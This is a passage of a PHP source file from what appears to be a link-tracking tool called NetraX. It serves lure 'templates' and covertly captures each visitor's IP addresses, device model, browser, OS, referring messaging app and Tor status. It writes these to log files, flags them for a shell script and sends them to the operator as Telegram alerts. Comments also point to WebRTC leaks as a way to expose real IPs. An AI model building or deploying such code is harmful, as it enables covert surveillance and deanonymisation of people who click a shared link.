            'pattern'     => '#\b(?:Linespider|Line/[0-9.]+)\b#i',
            'platform'    => 'Line',
            'type'        => 'Chat Link Preview',
            'description' => 'Link shared in Line Chat',
            'bot'         => 'Line Preview Spider',
        ],
        // Pinterest bot
        [
            'pattern'     => '#\b(?:Pinterest(?:bot)?|Pinterest/0\.2)\b#i',
            'platform'    => 'Pinterest',
            'type'        => 'Pin Preview',
            'description' => 'Link pinned or shared on Pinterest',
            'bot'         => 'Pinterest Bot',
        ],
        // Reddit bot
        [
            'pattern'     => '#\bredditbot\b#i',
            'platform'    => 'Reddit',
            'type'        => 'Post Preview',
            'description' => 'Link submitted on Reddit Post or Comment',
            'bot'         => 'Reddit Link Bot',
        ],
        // Search engines & other indexers
        [
            'pattern'     => '#\bGooglebot\b#i',
            'platform'    => 'Google Search',
            'type'        => 'Search Engine Crawler',
            'description' => 'Link crawled by Google Search Engine',
            'bot'         => 'Googlebot',
        ],
        [
            'pattern'     => '#\b(?:bingbot|msnbot)\b#i',
            'platform'    => 'Microsoft Bing',
            'type'        => 'Search Engine Crawler',
            'description' => 'Link crawled by Bing Search Engine',
            'bot'         => 'Bingbot',
        ],
        [
            'pattern'     => '#\bYahoo(?:.*Preview|.*Seeker)\b#i',
            'platform'    => 'Yahoo',
            'type'        => 'Link Preview Crawler',
            'description' => 'Link crawled by Yahoo Preview Engine',
            'bot'         => 'Yahoo Link Preview',
        ],
        [
            'pattern'     => '#\bDuckDuckBot\b#i',
            'platform'    => 'DuckDuckGo',
            'type'        => 'Search Engine Crawler',
            'description' => 'Link crawled by DuckDuckGo Privacy Engine',
            'bot'         => 'DuckDuckBot',
        ],
    ];

    foreach ($bots as $b) {
        if (preg_match($b['pattern'], $uaClean)) {
            $res['is_preview']  = true;
            $res['platform']    = $b['platform'];
            $res['type']        = $b['type'];
            $res['description'] = $b['description'];
            $res['bot_name']    = $b['bot'];
            return $res;
        }
    }

    return $res;
}

/* ══════════════════════════════════════════════════════════════════
   6.  TRAFFIC ORIGIN & REFERRAL SOURCE DETECTION
   ══════════════════════════════════════════════════════════════════ */

/**
 * Detect the originating app, referral platform, or campaign tag when a human
 * clicks and opens the link.
 *
 * @param  string $ua  User-Agent string
 * @return array{source_platform: string, source_type: string, source_detail: string, is_in_app: bool, raw_referer: string}
 */
function detectTrafficSource(string $ua = ''): array
{
    $referer     = trim($_SERVER['HTTP_REFERER'] ?? '');
    $xRequested  = trim($_SERVER['HTTP_X_REQUESTED_WITH'] ?? '');
    $uaClean     = sanitizeUserAgent($ua ?: ($_SERVER['HTTP_USER_AGENT'] ?? ''));
    $querySource = trim($_GET['utm_source'] ?? ($_GET['source'] ?? ($_GET['ref'] ?? ($_GET['src'] ?? ''))));

    $res = [
        'source_platform' => 'Direct / Browser',
        'source_type'     => 'Direct Navigation',
        'source_detail'   => 'Direct URL entry or bookmark',
        'is_in_app'       => false,
        'raw_referer'     => $referer,
    ];

    /* ── 1. Check Android X-Requested-With package ID (Highest accuracy for Android In-App WebViews) ── */
    if (!empty($xRequested)) {
        $packageMap = [
            'com.whatsapp'                        => ['WhatsApp', 'WhatsApp In-App WebView'],
            'com.whatsapp.w4b'                    => ['WhatsApp Business', 'WhatsApp Business In-App WebView'],
            'org.telegram.messenger'              => ['Telegram', 'Telegram Official Android App'],
            'org.telegram.plus'                   => ['Telegram (Plus Messenger)', 'Telegram Plus In-App WebView'],
            'org.thunderdog.challegram'           => ['Telegram X', 'Telegram X In-App WebView'],
            'com.google.android.apps.messaging'   => ['Google Messages (SMS/RCS)', 'Google Messages Text Message Link'],
            'com.samsung.android.messaging'       => ['Samsung Messages (SMS)', 'Samsung Messages Text Link'],
            'com.android.mms'                     => ['SMS / MMS Messaging', 'Default Android SMS App'],
            'com.instagram.android'               => ['Instagram', 'Instagram In-App Browser'],
            'com.facebook.katana'                 => ['Facebook App', 'Facebook In-App Browser'],
            'com.facebook.orca'                   => ['Facebook Messenger', 'Messenger In-App Browser'],
            'com.facebook.lite'                   => ['Facebook Lite', 'Facebook Lite In-App Browser'],
            'com.twitter.android'                 => ['Twitter / X', 'Twitter / X In-App Browser'],
            'com.snapchat.android'                => ['Snapchat', 'Snapchat In-App Browser'],
            'com.zhiliaoapp.musically'            => ['TikTok', 'TikTok In-App Browser'],
            'com.ss.android.ugc.trill'            => ['TikTok', 'TikTok In-App Browser'],
            'com.linkedin.android'                => ['LinkedIn', 'LinkedIn In-App Browser'],
            'com.discord'                         => ['Discord', 'Discord In-App Browser'],
            'com.reddit.frontpage'                => ['Reddit', 'Reddit In-App Browser'],
            'com.google.android.gm'               => ['Gmail', 'Gmail App Link'],
            'com.microsoft.office.outlook'        => ['Microsoft Outlook', 'Outlook App Link'],
            'com.skype.raider'                    => ['Skype', 'Skype App Link'],
            'com.viber.voip'                      => ['Viber', 'Viber Messenger In-App Browser'],
            'org.thoughtcrime.securesms'          => ['Signal', 'Signal Private Messenger Link'],
            'jp.naver.line.android'               => ['Line', 'Line Messenger In-App Browser'],
            'com.tencent.mm'                      => ['WeChat', 'WeChat In-App Browser'],
            'com.pinterest'                       => ['Pinterest', 'Pinterest In-App Browser'],
            'com.google.android.youtube'          => ['YouTube App', 'YouTube App In-App Browser'],
        ];

        foreach ($packageMap as $pkg => [$pName, $pDetail]) {
            if (stripos($xRequested, $pkg) !== false) {
                $res['source_platform'] = $pName;
                $res['source_type']     = 'In-App Browser (WebView)';
                $res['source_detail']   = $pDetail . " [pkg: {$xRequested}]";
                $res['is_in_app']       = true;
                return $res;
            }
        }

        /* Generic Android package */
        $res['source_platform'] = 'Android App (' . $xRequested . ')';
        $res['source_type']     = 'In-App Browser (WebView)';
        $res['source_detail']   = "Opened inside Android App [pkg: {$xRequested}]";
        $res['is_in_app']       = true;
        return $res;
    }

    /* ── 2. Check HTTP Referer Header ── */
    if (!empty($referer)) {
        $refererPatterns = [
            '#android-app://com\.whatsapp#i'                         => ['WhatsApp', 'In-App Link Click', 'WhatsApp Android App'],
            '#https?://(?:web\.)?whatsapp\.com#i'                    => ['WhatsApp Web', 'Web Link Click', 'WhatsApp Web Client'],
            '#android-app://org\.telegram#i'                         => ['Telegram', 'In-App Link Click', 'Telegram Android App'],
            '#https?://(?:t\.me|web\.telegram\.org)#i'               => ['Telegram', 'Chat Link Click', 'Telegram Link / Web App'],
            '#android-app://com\.google\.android\.apps\.messaging#i' => ['Google Messages (SMS/RCS)', 'SMS Link Click', 'Google Messages Text App'],
            '#android-app://com\.samsung\.android\.messaging#i'      => ['Samsung Messages (SMS)', 'SMS Link Click', 'Samsung Messages SMS App'],
            '#android-app://com\.android\.mms#i'                     => ['SMS / MMS App', 'SMS Link Click', 'Android Text Message App'],
            '#android-app://com\.apple\.mobilesms#i'                 => ['iMessage / Apple Messages', 'SMS Link Click', 'Apple Messages App'],
            '#android-app://com\.instagram\.android#i'               => ['Instagram', 'In-App Link Click', 'Instagram Android App'],
            '#https?://l\.instagram\.com#i'                          => ['Instagram', 'Social Link Click', 'Instagram Link Shim'],
            '#android-app://com\.facebook\.katana#i'                 => ['Facebook', 'In-App Link Click', 'Facebook Mobile App'],
            '#android-app://com\.facebook\.orca#i'                   => ['Facebook Messenger', 'Chat Link Click', 'Messenger App'],
            '#https?://(?:l|m|www|touch)\.facebook\.com#i'           => ['Facebook', 'Social Link Click', 'Facebook Web / App'],
            '#android-app://com\.twitter\.android#i'                 => ['Twitter / X', 'In-App Link Click', 'Twitter / X Android App'],
            '#https?://(?:t\.co|x\.com|twitter\.com)#i'              => ['Twitter / X', 'Social Link Click', 'Twitter t.co Link Wrapper'],
            '#android-app://com\.snapchat\.android#i'                => ['Snapchat', 'In-App Link Click', 'Snapchat Mobile App'],
            '#android-app://com\.(?:zhiliaoapp\.musically|ss\.android\.ugc\.trill)#i' => ['TikTok', 'In-App Link Click', 'TikTok App'],
            '#https?://(?:www\.)?tiktok\.com#i'                      => ['TikTok', 'Social Link Click', 'TikTok Web / App'],
            '#android-app://com\.linkedin\.android#i'                => ['LinkedIn', 'In-App Link Click', 'LinkedIn Android App'],
            '#https?://(?:www\.)?linkedin\.com#i'                    => ['LinkedIn', 'Social Link Click', 'LinkedIn Web'],
            '#android-app://com\.discord#i'                          => ['Discord', 'Chat Link Click', 'Discord Mobile App'],
            '#https?://(?:www\.)?discord\.com#i'                     => ['Discord', 'Chat Link Click', 'Discord Web'],
            '#android-app://com\.reddit\.frontpage#i'                => ['Reddit', 'In-App Link Click', 'Reddit Mobile App'],
            '#https?://(?:www\.)?reddit\.com#i'                      => ['Reddit', 'Social Link Click', 'Reddit Web'],
            '#android-app://com\.google\.android\.gm#i'              => ['Gmail', 'Email Link Click', 'Gmail Mobile App'],
            '#https?://mail\.google\.com#i'                          => ['Gmail', 'Email Link Click', 'Gmail Webmail'],
            '#android-app://com\.microsoft\.office\.outlook#i'       => ['Outlook', 'Email Link Click', 'Outlook Mobile App'],
            '#https?://outlook\.(?:live|office|office36e)\.com#i'    => ['Outlook', 'Email Link Click', 'Outlook Webmail'],
            '#android-app://com\.viber\.voip#i'                      => ['Viber', 'Chat Link Click', 'Viber App'],
            '#android-app://org\.thoughtcrime\.securesms#i'          => ['Signal', 'Chat Link Click', 'Signal Private Messenger'],
            '#android-app://jp\.naver\.line\.android#i'              => ['Line', 'Chat Link Click', 'Line Messenger App'],
            '#https?://(?:www\.)?google\.[a-z.]+#i'                  => ['Google Search', 'Search Engine Referral', 'Google Organic Search'],
            '#https?://(?:www\.)?bing\.com#i'                        => ['Microsoft Bing', 'Search Engine Referral', 'Bing Search'],
            '#https?://(?:www\.)?youtube\.com#i'                     => ['YouTube', 'Video Referral', 'YouTube Platform'],
        ];

        foreach ($refererPatterns as $pattern => [$pName, $pType, $pDetail]) {
            if (preg_match($pattern, $referer)) {
                $res['source_platform'] = $pName;
                $res['source_type']     = $pType;
                $res['source_detail']   = $pDetail;
                $res['is_in_app']       = (strpos($pattern, 'android-app:') !== false);
                return $res;
            }
        }

        /* Generic web referrer */
        $parsed = parse_url($referer, PHP_URL_HOST);
        if (!empty($parsed)) {
            $res['source_platform'] = 'Web (' . $parsed . ')';
            $res['source_type']     = 'Web Referral';
            $res['source_detail']   = 'Referred from website: ' . $parsed;
            return $res;
        }
    }

    /* ── 3. Check In-App Browser User-Agent Signatures ── */
    $inAppUaPatterns = [
        '#\bWhatsApp/[0-9.]+#i'                   => ['WhatsApp', 'WhatsApp In-App Browser'],
        '#\bTelegram\b#i'                         => ['Telegram', 'Telegram In-App Browser'],
        '#\bFB_IAB\b|\bFBAN\b|\bFBAV\b#i'         => ['Facebook', 'Facebook In-App Browser (FB_IAB)'],
        '#\bInstagram\b#i'                        => ['Instagram', 'Instagram In-App Browser'],
        '#\bTwitter(?:Android|Kit)?\b#i'          => ['Twitter / X', 'Twitter / X In-App Browser'],
        '#\bSnapchat\b#i'                         => ['Snapchat', 'Snapchat In-App Browser'],
        '#\b(?:musical_ly|ByteLocale|TikTok)\b#i' => ['TikTok', 'TikTok In-App Browser'],
        '#\bLinkedInApp\b#i'                      => ['LinkedIn', 'LinkedIn In-App Browser'],
        '#\bDiscord\b#i'                          => ['Discord', 'Discord In-App Browser'],
        '#\bMicroMessenger\b#i'                   => ['WeChat', 'WeChat In-App Browser'],
        '#\bLine/[0-9.]+#i'                       => ['Line', 'Line In-App Browser'],
        '#\bPinterest\b#i'                        => ['Pinterest', 'Pinterest In-App Browser'],
    ];

    foreach ($inAppUaPatterns as $pattern => [$pName, $pDetail]) {
        if (preg_match($pattern, $uaClean)) {
            $res['source_platform'] = $pName;
            $res['source_type']     = 'In-App Browser (WebView)';
            $res['source_detail']   = $pDetail;
            $res['is_in_app']       = true;
            return $res;
        }
    }

    /* ── 4. Check URL Campaign / Tracking Parameters ── */
    if (!empty($querySource)) {
        $qLower = strtolower($querySource);
        $qMap = [
            'whatsapp' => 'WhatsApp',
            'telegram' => 'Telegram',
            'sms'      => 'SMS / Text Message',
            'text'     => 'SMS / Text Message',
            'fb'       => 'Facebook',
            'facebook' => 'Facebook',
            'ig'       => 'Instagram',
            'insta'    => 'Instagram',
            'twitter'  => 'Twitter / X',
            'x'        => 'Twitter / X',
            'snapchat' => 'Snapchat',
            'tiktok'   => 'TikTok',
            'discord'  => 'Discord',
            'linkedin' => 'LinkedIn',
            'email'    => 'Email Campaign',
        ];

        if (isset($qMap[$qLower])) {
            $res['source_platform'] = $qMap[$qLower];
            $res['source_type']     = 'Tagged Link Campaign';
            $res['source_detail']   = "Link tagged with source={$querySource}";
            return $res;
        }
    }

    if (isset($_GET['fbclid'])) {
        $res['source_platform'] = 'Facebook';
        $res['source_type']     = 'Social Click';
        $res['source_detail']   = 'Facebook Click ID (fbclid) detected';
        return $res;
    }
    if (isset($_GET['gclid'])) {
        $res['source_platform'] = 'Google';
        $res['source_type']     = 'Ad / Search Click';
        $res['source_detail']   = 'Google Click ID (gclid) detected';
        return $res;
    }
    if (isset($_GET['igshid'])) {
        $res['source_platform'] = 'Instagram';
        $res['source_type']     = 'Social Share Click';
        $res['source_detail']   = 'Instagram Share ID (igshid) detected';
        return $res;
    }
    if (isset($_GET['tgwebappdata'])) {
        $res['source_platform'] = 'Telegram';
        $res['source_type']     = 'Telegram Mini-App';
        $res['source_detail']   = 'Telegram WebApp data passed';
        return $res;
    }

    return $res;
}

/* ══════════════════════════════════════════════════════════════════
   7.  MAIN CAPTURE FUNCTION
   ══════════════════════════════════════════════════════════════════ */

/**
 * Capture all visitor information and return a structured array.
 *
 * This is the primary public function. Call it once per request.
 *
 * Output array:
 *   'ip'              => string   Primary client IP or 'unknown'
 *   'ip_version'      => string   'IPv4' | 'IPv6' | ''
 *   'ipv4'            => string   Public IPv4 ('' if unavailable)
 *   'ipv6'            => string   Public IPv6 ('' if unavailable)
 *   'browser'         => string   Browser name
 *   'browser_version' => string   Browser version
 *   'os'              => string   Operating system
 *   'device_type'     => string   'Mobile' | 'Tablet' | 'Desktop'
 *   'device_model'    => string   Exact detected hardware model
 *   'source_platform' => string   WhatsApp | Telegram | SMS | Facebook | Direct ...
 *   'source_type'     => string   In-App Browser | Direct Navigation ...
 *   'source_detail'   => string   Detailed origin note
 *   'is_in_app'       => bool     True if in-app browser/webview
 *   'is_preview_bot'  => bool     True if preview/crawler bot
 *   'preview_info'    => array    Preview bot details if crawler
 *   'user_agent'      => string   Raw UA (for reference)
 *   'timestamp'       => string   ISO 8601 timestamp
 *
 * @return array  Structured visitor information
 */
function captureVisitorInfo(): array
{
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

    /* Detect each dimension */
    $ipInfo     = detectClientIP();
    $browser    = detectBrowser($ua);
    $os         = detectOS($ua);
    $device     = detectDeviceType($ua);
    $model      = detectDeviceModel($ua);
    $shareInfo  = detectShareOrPreview($ua, $ipInfo['ip']);
    $traffic    = detectTrafficSource($ua);
    $timestamp  = date('Y-m-d H:i:s');

    return [
        'ip'              => $ipInfo['ip'],
        'ip_version'      => $ipInfo['ip_version'],
        'ipv4'            => $ipInfo['ipv4'],
        'ipv6'            => $ipInfo['ipv6'],
        'browser'         => $browser['browser'],
        'browser_version' => $browser['browser_version'],
        'os'              => $os,
        'device_type'     => $device,
        'device_model'    => $model,
        'source_platform' => $traffic['source_platform'],
        'source_type'     => $traffic['source_type'],
        'source_detail'   => $traffic['source_detail'],
        'is_in_app'       => $traffic['is_in_app'],
        'is_preview_bot'  => $shareInfo['is_preview'],
        'preview_info'    => $shareInfo,
        'user_agent'      => $ua,
        'timestamp'       => $timestamp,
    ];
}

/* ══════════════════════════════════════════════════════════════════
   8.  TERMINAL OUTPUT & FORMATTERS
   ══════════════════════════════════════════════════════════════════ */

/**
 * Format a visitor info array as a clean terminal-friendly string.
 *
 * @param  array       $info          Output of captureVisitorInfo()
 * @param  string|null $templateName  Resolved template display name.
 *                                    Falls back to resolveTemplateName().
 * @return string                     Formatted multi-line block
 */
function formatVisitorLog(array $info, ?string $templateName = null): string
{
    $templateName = $templateName ?? resolveTemplateName();
    $divider      = str_repeat('─', 52);

    $ipLabel = $info['ip'];
    if (!empty($info['ip_version'])) {
        $ipLabel .= ' (' . $info['ip_version'] . ')';
    }

    /* Build separate IPv4 / IPv6 labels when available */
    $ipv4Label = !empty($info['ipv4']) ? $info['ipv4'] : 'Not detected';
    $ipv6Label = !empty($info['ipv6']) ? $info['ipv6'] : 'Not detected';

    $browserLabel = $info['browser'];
    if (!empty($info['browser_version'])) {
        $browserLabel .= ' ' . $info['browser_version'];
    }

    /* Device line: show exact model if detected */
    $deviceLabel = $info['device_type'];
    if (!empty($info['device_model'])) {
        $deviceLabel .= ' -- ' . $info['device_model'];
    }

    /* Referral / Origin line */
    $sourceLabel = $info['source_platform'] ?? 'Direct / Browser';
    if (!empty($info['source_detail']) && $info['source_detail'] !== 'Direct URL entry or bookmark') {
        $sourceLabel .= ' (' . $info['source_detail'] . ')';
    }
    $inAppLabel = !empty($info['is_in_app']) ? 'YES (In-App WebView)' : 'No (Standard Browser)';

    $lines = [
        '',
        $divider,
        '[VISITOR LOG]  ' . $templateName,
        $divider,
        'Referral: ' . $sourceLabel,
        'In-App  : ' . $inAppLabel,
        'IPv4    : ' . $ipv4Label,
        'IPv6    : ' . $ipv6Label,
        'Browser : ' . $browserLabel,
        'OS      : ' . $info['os'],
        'Device  : ' . $deviceLabel,
        'Tor     : ' . ((!empty($info['is_tor'])) ? 'YES --Tor exit node' : 'No'),
        'Time    : ' . $info['timestamp'],
        $divider,
    ];

    /* Append a prominent warning block when Tor is confirmed */
    if (!empty($info['is_tor'])) {
        $lines[] = '';
        $lines[] = '!! TOR BROWSER DETECTED --connection is anonymized !!';
        $lines[] = '   WebRTC leaks are BLOCKED by Tor Browser.';
        $lines[] = '   Real IP cannot be retrieved via WebRTC on this visit.';
        $lines[] = $divider;
    }

    $lines[] = '';

    return implode("\n", $lines);
}

/**
 * Format a Link Share / Preview alert as a high-visibility terminal block.
 *
 * @param  array  $shareInfo     Output of detectShareOrPreview()
 * @param  array  $visitorInfo   Output of captureVisitorInfo()
 * @param  string $templateName  Active template name
 * @return string                Formatted multi-line banner
 */
function formatShareAlert(array $shareInfo, array $visitorInfo, string $templateName): string
{
    $divider = str_repeat('═', 56);
    $subdiv  = str_repeat('─', 56);

    $platform = $shareInfo['platform'] ?? 'Social Platform';
    $desc     = $shareInfo['description'] ?? 'Link shared into chat';
    $bot      = $shareInfo['bot_name'] ?? 'Preview Bot';
    $ip       = $visitorInfo['ip'] ?? 'unknown';
    $time     = $visitorInfo['timestamp'] ?? date('Y-m-d H:i:s');

    $lines = [
        '',
        $divider,
        "  🔗 LINK SHARE DETECTED -- {$platform}",
        $divider,
        "  Platform  : {$platform}",
        "  Activity  : {$desc}",
        "  Template  : {$templateName}",
        "  Crawler   : {$bot}",
        "  Client IP : {$ip}",
        "  Time      : {$time}",
        "  Status    : Preview card rendered in recipient's chat!",
        $subdiv,
        "  ⚡ NetraX captured the social link share event.",
        $divider,
        '',
    ];

    return implode("\n", $lines);
}

/**
 * Print the visitor log to PHP's stderr (appears in the built-in
 * PHP server terminal) and also to error_log.
 *
 * @param string $logText  Pre-formatted log string
 */
function printVisitorToTerminal(string $logText): void
{
    /* stderr → shows in `php -S` terminal */
    file_put_contents('php://stderr', $logText);
    /* error_log → respects php.ini log destination */
    error_log($logText);
}

/* ══════════════════════════════════════════════════════════════════
   9.  DATA STORAGE  (visitor_logs + share_logs)
   ══════════════════════════════════════════════════════════════════ */

/**
 * Save link share event to data/share_logs.jsonl and data/share_logs.txt.
 *
 * @param array  $shareInfo    Preview/share metadata
 * @param array  $visitorInfo  Visitor/crawler information
 * @param string $dataDir      Path to data directory
 */
function saveShareLog(array $shareInfo, array $visitorInfo, string $dataDir): void
{
    if (!is_dir($dataDir)) {
        mkdir($dataDir, 0750, true);
    }

    $record = [
        'event'           => 'link_share_preview',
        'platform'        => $shareInfo['platform'],
        'type'            => $shareInfo['type'],
        'description'     => $shareInfo['description'],
        'bot_name'        => $shareInfo['bot_name'],
        'ip'              => $visitorInfo['ip'],
        'ipv4'            => $visitorInfo['ipv4'] ?? '',
        'ipv6'            => $visitorInfo['ipv6'] ?? '',
        'user_agent'      => $visitorInfo['user_agent'] ?? '',
        'template'        => $visitorInfo['template'] ?? resolveTemplateName($dataDir),
        'timestamp'       => $visitorInfo['timestamp'],
    ];

    $jsonLine = json_encode($record, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) . "\n";
    $jsonFile = $dataDir . '/share_logs.jsonl';
    $fp = fopen($jsonFile, 'a');
    if ($fp) {
        flock($fp, LOCK_EX);
        fwrite($fp, $jsonLine);
        flock($fp, LOCK_UN);
        fclose($fp);
        @chmod($jsonFile, 0640);
    }

    $txtFile = $dataDir . '/share_logs.txt';
    $entry = "[{$visitorInfo['timestamp']}] LINK SHARE: {$shareInfo['platform']} ({$shareInfo['type']}) | IP: {$visitorInfo['ip']} | Template: {$record['template']} | Bot: {$shareInfo['bot_name']}\n";
    $fp2 = fopen($txtFile, 'a');
    if ($fp2) {
        flock($fp2, LOCK_EX);
        fwrite($fp2, $entry);
        flock($fp2, LOCK_UN);
        fclose($fp2);
        @chmod($txtFile, 0640);
    }
}

/**
 * Append a visitor record as a JSON line to the log file.
 *
 * File is created automatically if it does not exist.
 * Uses file locking (LOCK_EX) to prevent race conditions.
 *
 * @param array  $info     Output of captureVisitorInfo()
 * @param string $dataDir  Absolute path to the data/ directory
 */
function saveVisitorLog(array $info, string $dataDir): void
{
    /* Ensure data directory exists */
    if (!is_dir($dataDir)) {
        mkdir($dataDir, 0750, true);
    }

    $logFile = $dataDir . '/visitor_logs.jsonl';

    /* Build a clean record (exclude raw UA from JSON to keep lines compact) */
    $record = [
        'ip'              => $info['ip'],
        'ip_version'      => $info['ip_version'],
        'ipv4'            => $info['ipv4'] ?? '',
        'ipv6'            => $info['ipv6'] ?? '',
        'source_platform' => $info['source_platform'] ?? 'Direct / Browser',
        'source_type'     => $info['source_type'] ?? 'Direct Navigation',
        'source_detail'   => $info['source_detail'] ?? '',
        'is_in_app'       => $info['is_in_app'] ?? false,
        'browser'         => $info['browser'],
        'browser_version' => $info['browser_version'],
        'os'              => $info['os'],
        'device_type'     => $info['device_type'],
        'device_model'    => $info['device_model'] ?? '',
        'is_tor'          => $info['is_tor'] ?? false,
        'template'        => $info['template'] ?? resolveTemplateName($dataDir),
        'timestamp'       => $info['timestamp'],
    ];

    $jsonLine = json_encode($record, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) . "\n";

    /* Append with exclusive file lock */
    $fp = fopen($logFile, 'a');
    if ($fp) {
        flock($fp, LOCK_EX);
        fwrite($fp, $jsonLine);
        flock($fp, LOCK_UN);
        fclose($fp);
        @chmod($logFile, 0640);
    }
}

/**
 * Append a human-readable visitor entry to a text log file.
 *
 * @param string $logText  Pre-formatted log block
 * @param string $dataDir  Absolute path to the data/ directory
 */
function saveVisitorLogReadable(string $logText, string $dataDir): void
{
    if (!is_dir($dataDir)) {
        mkdir($dataDir, 0750, true);
    }

    $logFile = $dataDir . '/visitor_logs.txt';

    $fp = fopen($logFile, 'a');
    if ($fp) {
        flock($fp, LOCK_EX);
        fwrite($fp, $logText);
        flock($fp, LOCK_UN);
        fclose($fp);
        @chmod($logFile, 0640);
    }
}

/* ══════════════════════════════════════════════════════════════════
   10. ALL-IN-ONE: CAPTURE → LOG → SAVE → RETURN
   ══════════════════════════════════════════════════════════════════

   Call this single function from ip.php or any global bootstrap.
   It performs the full pipeline and returns the info array.
   ══════════════════════════════════════════════════════════════════ */

/**
 * Capture visitor info, detect link shares / previews, print to terminal,
 * save to data/, and signal the shell script via flag files.
 *
 * @param  string|null $dataDir  Override data directory (default: __DIR__/data)
 * @return array                 Structured visitor info
 */
function processVisitor(?string $dataDir = null): array
{
    $dataDir = $dataDir ?? (dirname(__FILE__, 2) . '/data');

    /* Resolve the active template name once (cached internally) */
    $templateName = resolveTemplateName($dataDir);

    /* Capture */
    $info = captureVisitorInfo();

    /* Attach the resolved template name to the info array */
    $info['template'] = $templateName;

    /* Tor exit node detection (IPv4: DNS; IPv6: cached bulk list; Host heuristics) */
    $info['is_tor'] = detectTorExit($info['ip'], $dataDir);

    if ($info['is_tor']) {
        $origVer = $info['browser_version'] ?? '';
        $info['browser']         = 'Tor Browser';
        $info['browser_version'] = ($origVer ? "{$origVer} (Firefox ESR)" : '(Firefox ESR)');
        $info['os']              = $info['os'] . ' (Tor Anonymity Set)';
        $info['device_type']     = 'Desktop (Tor Anonymized)';
    }

    /* ── Check if this request is a Link Share / Preview Crawler ── */
    if (!empty($info['is_preview_bot']) && !empty($info['preview_info']['is_preview'])) {
        $shareInfo = $info['preview_info'];
        $shareText = formatShareAlert($shareInfo, $info, $templateName);

        /* Print to terminal */
        printVisitorToTerminal($shareText);

        /* Save to share logs */
        saveShareLog($shareInfo, $info, $dataDir);

        /* Send Telegram Share Alert (deduplicated per 10s per IP+platform) */
        $dedupKey  = md5($info['ip'] . '|' . $shareInfo['platform']);
        $dedupFile = $dataDir . '/.share_dedup_' . $dedupKey;
        $isDup     = false;
        if (is_file($dedupFile) && (time() - (int) @filemtime($dedupFile)) < 10) {
            $isDup = true;
        }

        if (!$isDup) {
            @touch($dedupFile);
            sendTelegramShareAlert(
                $shareInfo['platform'],
                [
                    'Platform' => $shareInfo['platform'] . ' (' . $shareInfo['type'] . ')',
                    'Activity' => $shareInfo['description'],
                    'Template' => $templateName,
                    'Crawler'  => $shareInfo['bot_name'],
                    'IP'       => $info['ip'],
                    'Status'   => 'Preview card generated in chat!',
                    'Time'     => $info['timestamp'],
                ]
            );

            /* Signal the shell script with the link share banner */
            file_put_contents($dataDir . '/.flag_share', $shareText);
        }

        return $info;
    }

    /* Check if we got meaningful data */
    $hasIP      = ($info['ip'] !== 'unknown' && $info['ip'] !== '');
    $hasBrowser = ($info['browser'] !== 'Unknown');
    $hasOS      = ($info['os'] !== 'Unknown');

    if (!$hasIP && !$hasBrowser && !$hasOS) {
        /* No meaningful visitor details detected --print notice only */
        $notice = "\n[VISITOR LOG] Details not found --no IP, browser, or OS detected.\n"
                . "Template: " . $templateName . "\n"
                . "Time: " . $info['timestamp'] . "\n";
        file_put_contents('php://stderr', $notice);
        error_log($notice);
        return $info;
    }

    /* Format --pass the resolved template name */
    $logText = formatVisitorLog($info, $templateName);

    /* Terminal output */
    printVisitorToTerminal($logText);

    /* ── Telegram Notification: Visitor Arrived ── */
    $isTor       = !empty($info['is_tor']);
    $torLabel    = $isTor ? '🟠 YES -- Tor Exit Node' : 'No';
    $ipv4Label   = !empty($info['ipv4']) ? $info['ipv4'] : 'Not detected';
    $ipv6Label   = !empty($info['ipv6']) ? $info['ipv6'] : 'Not detected';
    $brLabel     = $info['browser'] . (!empty($info['browser_version']) ? ' ' . $info['browser_version'] : '');
    $deviceLabel = $info['device_type'];
    if (!empty($info['device_model'])) {
        $deviceLabel .= ' -- ' . $info['device_model'];
    }
    $sourceLabel = $info['source_platform'];
    if (!empty($info['source_detail']) && $info['source_detail'] !== 'Direct URL entry or bookmark') {
        $sourceLabel .= ' (' . $info['source_detail'] . ')';
    }
    if (!empty($info['is_in_app'])) {
        $sourceLabel .= ' [In-App WebView]';
    }

    sendTelegramAlert(
        '📡 New Visitor -- ' . $templateName,
        [
            'Template' => $templateName,
            'Origin'   => $sourceLabel,
            'IPv4'     => $ipv4Label,
            'IPv6'     => $ipv6Label,
            'Browser'  => $brLabel,
            'OS'       => $info['os'],
            'Device'   => $deviceLabel,
            'Tor'      => $torLabel,
            'Time'     => $info['timestamp'],
        ]
    );

    /* Save JSON line log (includes template & referral fields) */
    saveVisitorLog($info, $dataDir);

    /* Save readable text log */
    saveVisitorLogReadable($logText, $dataDir);

    /* Signal the shell script (netraX-3.0.sh checkfound loop) */
    $flagContent = $logText;
    file_put_contents($dataDir . '/.flag_visitor', $flagContent);

    /* Write a dedicated Tor flag when the visitor is on Tor */
    if (!empty($info['is_tor'])) {
        $torAlert = "TOR EXIT NODE DETECTED\n"
                  . 'IP   : ' . $info['ip'] . "\n"
                  . 'Time : ' . $info['timestamp'] . "\n";
        file_put_contents($dataDir . '/.flag_tor', $torAlert);
    }

    return $info;
}

/* ══════════════════════════════════════════════════════
   10.  TOR EXIT NODE DETECTION
   ══════════════════════════════════════════════════════

   IPv4 exit nodes --real-time DNS query against Tor Project DNSEL:
     <reversed-quad>.dnsel.torproject.org → 127.0.0.2 = exit node

   IPv6 & IPv4 exit nodes --checked against Tor Project's exit-addresses
     (data/.tor_exit_cache). Cache is refreshed every 24 hours from
     https://check.torproject.org/exit-addresses (includes IPv4 & IPv6).

   Hostname & ISP heuristics --checks reverse DNS for known Tor relay patterns.
   ══════════════════════════════════════════════════════ */

/**
 * Refresh the Tor bulk exit list cache if missing or older than 24 h.
 * Fetches from https://check.torproject.org/exit-addresses which includes
 * both IPv4 and IPv6 exit addresses.
 *
 * @param string $dataDir  Absolute path to the data/ directory
 */
function refreshTorCache(string $dataDir): void
{
    $cacheFile = $dataDir . '/.tor_exit_cache';
    $maxAge    = 86400; // 24 hours in seconds

    if (is_file($cacheFile) && (time() - (int) @filemtime($cacheFile)) < $maxAge) {
        return; // cache is fresh
    }

    $raw = @file_get_contents('https://check.torproject.org/exit-addresses');
    if ($raw === false || strlen($raw) < 200) {
        $raw = @file_get_contents('https://check.torproject.org/torbulkexitlist');
    }

    if ($raw !== false && strlen($raw) > 200) {
        if (!is_dir($dataDir)) {
            mkdir($dataDir, 0750, true);
        }

        /* Extract IPs from ExitAddress lines or raw list */
        $ips = [];
        if (preg_match_all('/ExitAddress\s+([0-9a-fA-F.:]+)/i', $raw, $matches)) {
            $ips = $matches[1];
